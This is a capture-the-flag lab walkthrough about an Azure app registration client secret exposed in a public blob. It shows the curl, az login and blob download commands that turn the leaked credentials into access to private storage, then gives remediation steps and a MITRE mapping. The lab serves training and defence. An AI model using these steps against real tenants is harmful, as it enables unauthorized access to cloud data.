# Exposed App Registration Client Secret

**Difficulty:** Intermediate | **Provider:** Azure | **Category:** Identity / Credential Exposure

## Scenario

A developer checked an application `config.json` into a public Azure Blob Storage container
"for the ops team to access easily". The config file contains the **client ID and client secret**
of an Entra ID app registration. The service principal behind that registration was granted
`Storage Blob Data Reader` on a private storage account containing the flag.

The attacker discovers the public config blob, extracts the SP credentials, authenticates,
and reads the flag.

## Attack Path

```
[Attacker]
    |
    v
curl <config_blob_url>  -->  config.json (anonymous read)
    |
    v
Extract tenant_id, client_id, client_secret
    |
    v
az login --service-principal -u <client_id> -p <secret> --tenant <tenant_id>
    |
    v
az storage blob download --account-name <flag_acct> --container-name secrets
    --name flag.txt --auth-mode login  -->  flag
```

### Step 1 — Download the public config

```bash
CONFIG_URL="<config_blob_url>"

curl -s "${CONFIG_URL}" | python3 -m json.tool
```

Extract `azure.tenant_id`, `azure.client_id`, and `azure.client_secret`.

### Step 2 — Authenticate as the service principal

```bash
az login --service-principal \
  -u "<client_id>" \
  -p "<client_secret>" \
  --tenant "<tenant_id>"
```

### Step 3 — Read the flag

```bash
az storage blob download \
  --account-name "<flag_storage_account>" \
  --container-name secrets \
  --name flag.txt \
  --auth-mode login \
  --file /dev/stdout
```

## How to Fix in Production

1. **Never store client secrets in configuration files**, even internally — use Key Vault references or Managed Identity.
2. **Enable secret scanning** (GitHub Advanced Security, Azure DevOps credential scanner) to detect checked-in credentials before they reach a public endpoint.
3. **Rotate immediately** — if a client secret has been in a public blob, treat it as compromised and regenerate it.
4. **Use Managed Identity** instead of client credentials wherever the workload runs on Azure compute.
5. **Apply Conditional Access policies** to service principals to restrict token issuance to known IP ranges.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Unsecured Credentials: Credentials in Files | T1552.001 |
| Valid Accounts: Cloud Accounts | T1078.004 |
| Data from Cloud Storage | T1530 |
| Cloud Storage Object Discovery | T1619 |
